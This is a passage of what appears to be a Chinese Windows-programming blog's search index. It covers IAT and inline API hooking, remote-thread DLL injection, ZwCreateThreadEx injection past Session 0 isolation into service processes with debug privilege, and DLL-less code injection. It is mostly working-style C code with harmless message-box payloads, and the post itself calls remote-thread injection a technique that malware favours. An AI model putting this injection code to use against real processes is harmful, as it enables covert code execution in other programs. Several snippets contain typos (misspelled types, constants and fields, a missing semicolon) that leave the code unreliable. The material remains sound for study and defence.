(DWROD64)GetProcAddress(GetModuleHandle(lpModuleName), szFuncName); // 获取程序基址 HMODULE hModule = GetModuleHandle(NULL); // 定位DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; // 定位NT头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew); // 获取导入表RVA DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // 定位导入表 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)hModule + dwImportRVA); while(pImport-&gt;Nmae) &#123; const char* szDllName = (char*)((DWORD64)hModule + pImport-&gt;Name); char szName[MAXBYTE] = &#123; 0 &#125;; strcpy_s(szName, szDllName) if(strcmp(_strlwr(szName), &quot;kernel32.dll&quot;) == 0) &#123; PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk); while(pThunk-&gt;Function) &#123; if(pThunk-&gt;Function == dwFuncAddr) &#123; DWORD64 dwOldProtect; VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;Function, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); pThunk-&gt;Function = (DWORD64)MyCreateFileW; break; &#125; pThunk++; &#125; break; &#125; pImport++; &#125;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: IATHook(L&quot;kernel32.dll&quot;, L&quot;CreateFileW&quot;); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"}]},{"title":"Inline Hook","slug":"Inline-Hook","date":"2023-05-21T03:22:04.000Z","updated":"2023-05-27T13:24:14.208Z","comments":true,"path":"1b00de47.html","link":"","permalink":"http://example.com/1b00de47.html","excerpt":"Inline Hook(内联钩子注入)流程构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节将构造的跳转指令写入需HOOK的位置处当被HOOK位置被执行时会转到自己的流程执行如果要执行原来的流程，取消HOOK，还原被修改的字节执行原来的流程继续HOOK住原来的位置","text":"Inline Hook(内联钩子注入)流程构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节将构造的跳转指令写入需HOOK的位置处当被HOOK位置被执行时会转到自己的流程执行如果要执行原来的流程，取消HOOK，还原被修改的字节执行原来的流程继续HOOK住原来的位置 仓库地址 5字节Inline Hook（x86）5字节Inline Hook中jcc指令长度为5根据计算公式：JMP后的偏移量 &#x3D; 目标地址 - 原地址- 5 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980PROC m_FuncAddress; // 要Hook的函数地址BYTE m_OldBytes[5]; // 要Hook函数的头5个字节BYTE m_NewBytes[5]; // 要替换到目标函数头五个字节的新字节（jmp xxxxxxxx/ E9 xxxxxxxx）BOOL Hook(const char* pszModuleName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = (PROC)GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if(m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 5, &amp;dwSize); m_NewBytes[0] = &#x27;\\xE9&#x27;; *(DWORD*)(m_NewBytes + 1) = (DWORD)pfnHookFunc - (DWORD)m_FuncAddress - 5; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 5, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if (m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 5, &amp;dwSize); &#125; return TRUE;&#125;BOOL ReHook()&#123; if (m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 5, &amp;dwSize); &#125; return TRUE;&#125;intWINAPIMyMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxA(hWnd, &quot;Hello Dokey&quot;, &quot;Hello Dokey&quot;, uType); ReHook(); return nRet;&#125;// VA Virtual Address // HMODULE hModule 模块加载基址 ImageBase 模块句柄// DWORD ul_reason_for_call 以什么原因触发的BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: // MessageBox(NULL, &quot;Dokey&quot;, &quot;Dokey&quot;, MB_OK); m_FuncAddress = NULL; memset(m_OldBytes, 0, 5); memset(m_NewBytes, 0, 5); Hook(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;, (PROC)MyMessageBoxA); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: UnHook(); break; &#125; return TRUE;&#125; 7字节Inline Hook（x86）5字节Inline Hook通过构造一个jmp指令来修改目标函数入口的字节内容，jmp指令后面的偏移量是由于CPU机器码要求jmp指令后是一个偏移量7字节Inline Hook通过修改函数入口的两条指令来完成一条是把目标地址存入寄存器eax中: mov eax, xxxxxxxx / B8 xxxxxxxx然后用jmp指令直接跳转到寄存器eax中保存的地址: jmp eax / FF E0通过指令的机器码是不变的，变化的只有地址，需要将目标函数地址保存在从第一至第四字节的位置就可以了Byte bJmpCode[] = {&#39;\\xb8&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\0&#39;, &#39;\\xff&#39;, &#39;\\xe0&#39;} 代码实现12345678910111213141516171819202122232425262728293031323334353637383940PROC m_FuncAddress;BYTE m_OldBytes[7];BYTE m_NewBytes[7];BOOL Hook(const char* pszModuleName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if(m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 7, &amp;dwSize); m_NewBytes[0] = &#x27;\\xb8&#x27;; m_NewBytes[5] = &#x27;\\xff&#x27;; m_NewBytes[6] = &#x27;\\xe0&#x27;; *(DWORD*)(m_NewBytes + 1) = (DWORD)pfnHookFunc; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 7, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if(m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 7, &amp;dwSize); &#125; return TRUE;&#125;BOOL ReHook()&#123; if(m_FuncAddress != 0) &#123; SIZE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 7, &amp;dwSize); &#125; return TRUE;&#125; 12字节Inline Hook（x64）原理： mov rax, Address/jmp rax;硬编码： Byte[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0} 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980PROC m_FuncAddress;BYTE m_OldBytes[12];BYTE m_NewBytes[12];BOOL Hook(const char* pszModulesName, const char* pszFuncName, PROC pfnHookFunc)&#123; m_FuncAddress = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if (m_FuncAddress == NULL) &#123; return FALSE; &#125; SIZE_T dwSize = 0; ReadProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 12, &amp;dwSize); m_NewBytes[0] = &#x27;\\x48&#x27;; m_NewBytes[1] = &#x27;\\xb8&#x27;; m_NewBytes[10] = &#x27;\\xff&#x27;; m_NewBytes[11] = &#x27;\\xe0&#x27;; *(DWORD64*)(m_NewBytes + 2) = (DWORD64)pfnHookFunc; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 12, &amp;dwSize); return TRUE;&#125;BOOL UnHook()&#123; if(m_FuncAddress == 0) &#123; return FALSE; &#125; SITE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_OldBytes, 12, &amp;dwSize); return TRUE;&#125;BOOL ReHook()&#123; if(m_FuncAddress == 0) &#123; return FALSE; &#125; SIZTE_T dwSize = 0; WriteProcessMemory(GetCurrentProcess(), m_FuncAddress, m_NewBytes, 12, &amp;dwSize);&#125;intWINAPIMyMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxA(hWnd, &quot;Dokey 12&quot;, &quot;Dokey 12&quot;, uType); ReHook(); return nRet;&#125;intWINAPIMyMessageBoxW( _In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType)&#123; UnHook(); int nRet = MessageBoxW(hWnd, L&quot;Dokey 12&quot;, L&quot;Dokey 12&quot;, uType); ReHook(); return nRet;&#125;#ifdef UNICODE#define MyMessageBox MyMessageBoxWconstexpr auto MessageBoxText = &quot;MessageBoxW&quot;;#else#define MyMessageBox MyMessageBoxAconstexpr auto MessageBoxText = &quot;MessageBoxA&quot;;#endif // !UNICODE...","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"}]},{"title":"远程线程注入","slug":"远程线程注入","date":"2023-05-17T13:46:55.000Z","updated":"2023-05-28T02:23:25.367Z","comments":true,"path":"cf459526.html","link":"","permalink":"http://example.com/cf459526.html","excerpt":"远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。","text":"远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。 CreateRemoteThread 远程线程注入OpenProcess 函数 打开现有的本地进程对象 1234567HANDLEWINAPIOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ); OpenProcessdwDesiredAccess: 访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或多个进程访问权限。bInheritHandle: 此进程创建的进程是否可以继承该句柄dwProcessId: 要打开的本地进程PID如果函数成功，则返回值是打开指定进程的句柄如果函数失败，则返回值为NULL VirtualAllocEx 函数 在指定进程的虚拟地址空间内保留、提交或更改内存状态 123456789LPVOIDWINAPIVirtualAllocEx( _In_ HANDLE hProcess, _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect ); VirtualAllocExhProcess: 进程句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION权限lpAddress: 指定要分配页面所需起始地址的指针。如果lpAddress为NULL，则该函数自动分配内存dwSize: 要分配内存大小，以字节为单位flAllocationType: 内存分配类型。此参数必须为以下值之一值含义MEM_COMMIT在磁盘分页和整体内存中，为指定预留内存页分配内存MEM_RESERVE保留进程中虚拟地址空间的范围，但不会在磁盘或内存上的分页文件中分配任何实际物理存储位置MEM_RESET表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入MEM_RESET_UNDO只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDOflProtect: 要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下值之一PAGE_NOACCESSPAGE_GUARDPAGE_NOCACHEPAGE_WRITECOMBINE如果函数成功，则返回值是分配页面的基址如果函数失败，则返回值为NULL WriteProcessMemory 函数 在指定进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败 123456789BOOLWINAPIWriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); WriteProcessMemoryhProcess: 要修改的进程内存句柄。句柄必须具有PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION访问权限lpBaseAddress: 指向指定进程中写入数据的基地址指针。在数据传输之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败lpBuffer: 指向缓冲区指针。其中包含要写入指定进程的地址空间中的数据nSize: 要写入指定进程的字节数lpNumberOfBytesWritten: 指向变量指针，该变量接收传输到指定进程的字节数。如果lpNumberOfBytesWritten为NULL，则忽略该参数如果函数成功，则返回值不为零如果函数失败，则返回值为零 CreateRemoteThread 函数 在另一个进程的虚拟地址空间中创建运行的线程 1234567891011HANDLEWINAPICreateRemoteThread( _In_ HANDLE hProcess, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId ); CreateRemoteThreadhProcess: 要创建线程的进程句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PEOCESS_VM_READ访问权限lpThreadAttributes: 指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果lpThreadAttributes为NULL，则线程将获得默认的安全描述符，并且不能继承该句柄dwStackSize: 堆栈的初始化大小，以字节为单位。如果此参数为0，则新线程使用可执行文件的默认大小lpStartAddress: 指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中lpParameter: 指向要传递给线程函数的变量指针dwCreationFlags: 控制线程创建的标志，若是0，则表示线程在创建后立即执行lpThreadId: 指向接收线程标识符的变量指针。如果此参数为NULL，则不返回线程标识符如果函数成功，则返回值是新线程的句柄如果函数失败，则返回值为NULL 远程线程注入代码实现1234567891011121314151617181920212223242526272829BOOL Inject(DWORD dwPid, const WCHAR* szPath)&#123; // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); // 申请内存 LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_CONMIT | MEM_RESERVE, PAGE_READWRITE); if (lpAddress == 0) &#123; printf(&quot;VirtualAllocEx Failed&quot;); return FALSE; &#125; // 把动态链接库写入到目标内存中 SIZE_T szWriteLength = 0; WriteProcessMemory(hProcess, lpAddress, szPath, ((wcslen(szPath) + 1) * 2), &amp;szWrithLength); // 创建远程线程，把LoadLibrary作为回调函数，并且把刚才的地址作为参数进行调用 HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, NULL, NULL); if (hThread == 0) &#123; printf(&quot;CreateRemoteThread Failed&quot;); return FALSE; &#125; // 等待线程执行结束 WaitForSingleObject(hThread, -1); // 清理、释放空间 VirtualFreeEx(hProcess, lpAddress, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hThread); return TRUE;&#125; ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入 与传统的CreateRemoteThread函数实现的远程线程注入DLL的唯一区别在于，突破SESSION 0远程线程注入是使用比CreateRemoteThred函数更为底层的ZwCreateThreadEx函数来创建远程线程。ZwCreateThreadEx函数可以突破SESSION 0隔离，将DLL成功注入到SESSION 0隔离的系统服务进程中。其中ZwCreateThreadEx在ntdll.dll中并没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址 函数声明64位系统下函数声明 12345678910111213DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown) 32位系统下函数声明 12345678910111213DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown) ZwCreateThreadEx 注入代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134BOOL ZwCreateThreadExInjectDll(DWORD dwPid, char* szDllPath)&#123; // 打开进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if(hProcess == NULL) &#123; printf(&quot;OpenProcess Failed\\n&quot;); return FALSE; &#125; // 在目标进程申请内存 DWORD dwSize = 1 + lstrlen(szDllPath); LPVOID lpDllAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); // 将数据写入目标进程 if (FALSE == WriteProcessMemory(hProcess, lpDllAddress, szDllPath, dwSize, NULL)) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif // 获取ntdll.dll HMODULE hNtDll = LoadLibrary(&quot;ntdll.dll&quot;); if(hNtDll == NULL) &#123; printf(&quot;Load ntdll Failed\\n&quot;); return FALSE; &#125; // 获取LoadLibrary地址 FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if(pFuncProcAddr == NULL) &#123; printf(&quot;Get LoadLibrary Failed\\n&quot;); return FALSE; &#125; // 获取ZwCreateThreadEx地址 typedef_ZwCreateThreadEx zwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtDll, &quot;ZwCreateThreadEx&quot;); HANDLE hRemoteThread = 0; DWORD dwZwCreateThreadEx = zwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, lpDllAddress, 0, 0, 0, 0, NULL); if(hRemoteThread == NULL) &#123; printf(&quot;zwCreateThreadEx Failed\\n&quot;); return FALSE; &#125; // 关闭句柄 VirtualFreeEx(hProcess, lpDllAddress, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;// OpenProcess打开高权限的进程需要提权BOOL EnablePrivileges(HANDLE hProcess, const char* pszPrivilegesName)&#123; HANDLE hToken = NULL; LUID luidValue = &#123; 0 &#125;; TOKEN_PRIVILEGES tokenPrivileges = &#123; 0 &#125;; BOOL bRet = FALSE; DWORD dwRet = 0; // 打开进程令牌并获取进程令牌句柄 bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken); if (FALSE == bRet) &#123; printf(&quot;OpenProcessToken&quot;); return FALSE; &#125; // 获取本地系统的 pszPrivilegesName 特权的LUID值 bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &amp;luidValue); if (FALSE == bRet) &#123; printf(&quot;LookupPrivilegeValue&quot;); return FALSE; &#125; // 设置提升权限信息 tokenPrivileges.PrivilegeCount = 1; tokenPrivileges.Privileges[0].Luid = luidValue; tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 提升进程令牌访问权限 bRet = ::AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, 0, NULL, NULL); if (FALSE == bRet) &#123; printf(&quot;AdjustTokenPrivileges&quot;); return FALSE; &#125; else &#123; // 根据错误码判断是否特权都设置成功 dwRet = ::GetLastError(); if (ERROR_SUCCESS == dwRet) &#123; printf(&quot;SUCCESS!!\\n&quot;); return TRUE; &#125; else if (ERROR_NOT_ALL_ASSIGNED == dwRet) &#123; printf(&quot;ERROR_NOT_ALL_ASSIGNED&quot;); return FALSE; &#125; &#125; return FALSE;&#125;int main()&#123; HANDLE hProcess = GetCurrentProcess(); EnablePrivileges(hProcess, SE_DEBUG_NAME); const char* szDllPath = &quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\Dll1.dll&quot;; ZwCreateThreadExInjectDll(1364, szDllPath); system(&quot;pause&quot;); return 0;&#125; 卸载被注入的DLL文件FreeLibrary 函数12345BOOLWINAPIFreeLibrary( _In_ HMODULE hLibModule // dll 模块句柄 ); FreeLibraryFreeLibrary函数使用的模块句柄可以通过前面介绍的Module32First和Module32Next两个函数获取，需要用到MODULEENTRY32结构体 12345678910111213typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32; MODULEENTRY32hModule: 模块句柄szModule: 模块名称szExePath: 完整的模块的路径（包括路径和模块名称） 卸载DLL文件代码实现12345678910111213141516171819202122232425262728293031323334VOID UnInjectDll(DWORD dwPid, char* szDllName)&#123; if(dwPid == 0 || lstrlen(szDllName) == 0) &#123; return; &#125; // 拍摄进程快照，需要包含TlHelp32.h头文件 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SANPMODULE, dwPid) MODULEENTRY32 me32; me32.dwSize = sizeof(me32); // 查找匹配的模块名 BOOL bRet = Module32First(hSnap, &amp;me32); while (bRet) &#123; if(lstrcmp(strupr(me32.szExePath), strupr(szDllName)) == 0) &#123; break; &#125; bRet = Module32Next(hSnap, &amp;me32); &#125; CloseHandle(hSnap); // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); // 获取FreeLibrary函数地址 FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;FreeLibrary&quot;); // 卸载dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, me32.hModule, 0, NULL); // WaitForSingleObject(hThread, INFINITE); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return;&#125; 无DLL的代码注入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;iostream&gt;#include &lt;Windows.h&gt;constexpr auto STRLEN = 20;typedef struct _Data &#123; FARPROC dwLoadLibrary; FARPROC dwGetProcAddress; FARPROC dwGetModuleHandle; FARPROC dwGetModuleFileName; char User32Dll[STRLEN]; char MessageBox[STRLEN]; char Str[STRLEN];&#125;DATA, *PDATA;DWORD WINAPI RemoteThreadProc(LPVOID lpParam)&#123; PDATA pData = (PDATA)lpParam; // 定义API函数原型 HMODULE(__stdcall * MyLoadLibrary)(LPCTSTR); FARPROC(__stdcall * MyGetProcAddress)(HMODULE, LPCSTR); HMODULE(__stdcall * MyGetModuelHandle)(LPCTSTR); int(__stdcall * MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT); DWORD(__stdcall * MyGetModuleFileName)(HMODULE, LPTSTR, DWORD); // 对各函数地址进行赋值 MyLoadLibrary = (HMODULE(__stdcall*)(LPCTSTR))pData-&gt;dwLoadLibrary; MyGetProcAddress = (FARPROC(__stdcall*)(HMODULE, LPCSTR))pData-&gt;dwGetProcAddress; MyGetModuelHandle = (HMODULE(__stdcall*)(LPCTSTR))pData-&gt;dwGetModuleHandle; MyGetModuleFileName = (DWORD(__stdcall*)(HMODULE, LPTSTR, DWORD))pData-&gt;dwGetModuleFileName; // 加载user32.dll HMODULE hModule = MyLoadLibrary((LPCTSTR)pData-&gt;User32Dll); MyMessageBox = (int(__stdcall*)(HWND, LPCTSTR, LPCTSTR, UINT))MyGetProcAddress(hModule, pData-&gt;MessageBox); char szModuleFileName[MAX_PATH] = &#123; 0 &#125;; MyGetModuleFileName(hModule, (LPTSTR)szModuleFileName, MAX_PATH); MyMessageBox(NULL, (LPCTSTR)pData-&gt;Str, (LPCTSTR)szModuleFileName, MB_OK); return 0;&#125;VOID noDllInjectCode(DWORD dwPid)&#123; // 打开进程获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;OpenProcess Failed\\n&quot;); return; &#125; DATA Data = &#123; 0 &#125;; // 获取kernel32.dll中相关的导出函数 Data.dwLoadLibrary = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;LoadLibraryA&quot;); Data.dwGetProcAddress = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetProcAddress&quot;); Data.dwGetModuleHandle = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetModuleHandleA&quot;); Data.dwGetModuleFileName = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32.dll&quot;)), &quot;GetModuleFileNameA&quot;); // 需要其他DLL和导出函数 lstrcpy((LPSTR)Data.User32Dll, TEXT(&quot;user32.dll&quot;)); lstrcpy((LPSTR)Data.MessageBox, TEXT(&quot;MessageBoxA&quot;)); lstrcpy((LPSTR)Data.Str, TEXT(&quot;Dokey Inject Code&quot;)); // 在目标进程申请内存空间 LPVOID lpData = VirtualAllocEx(hProcess, NULL, sizeof(Data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpData == NULL) &#123; printf(&quot;VirtualAllocEx1 Failed\\n&quot;); return; &#125; // 将数据写入目标内存中 SIZE_T dwWriteLen = 0; BOOL bRet = WriteProcessMemory(hProcess, lpData, &amp;Data, sizeof(Data), &amp;dwWriteLen); if (bRet == FALSE) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return; &#125; // 在目标进程申请内存用于保存代码长度 DWORD dwFunction = 0x4000; LPVOID lpCode = VirtualAllocEx(hProcess, NULL, dwFunction, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpCode == NULL) &#123; printf(&quot;VirtualAllocEx2 Failed\\n&quot;); return; &#125; bRet = WriteProcessMemory(hProcess, lpCode, &amp;RemoteThreadProc, dwFunction, &amp;dwWriteLen); if (bRet == FALSE) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return; &#125; HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpCode, lpData, 0, NULL); if (hThread == NULL) &#123; printf(&quot;CreateRemoteThread Failed\\n&quot;); return; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return;&#125;int main()&#123; noDllInjectCode(3076); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows Inject","slug":"windows-Inject","permalink":"http://example.com/tags/windows-Inject/"}]},{"title":"数据目录表解析","slug":"数据目录表解析","date":"2023-05-09T13:40:35.000Z","updated":"2023-12-13T12:24:22.516Z","comments":true,"path":"9180d97d.html","link":"","permalink":"http://example.com/9180d97d.html","excerpt":"基础知识基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA)","text":"基础知识基地址(ImageBase): 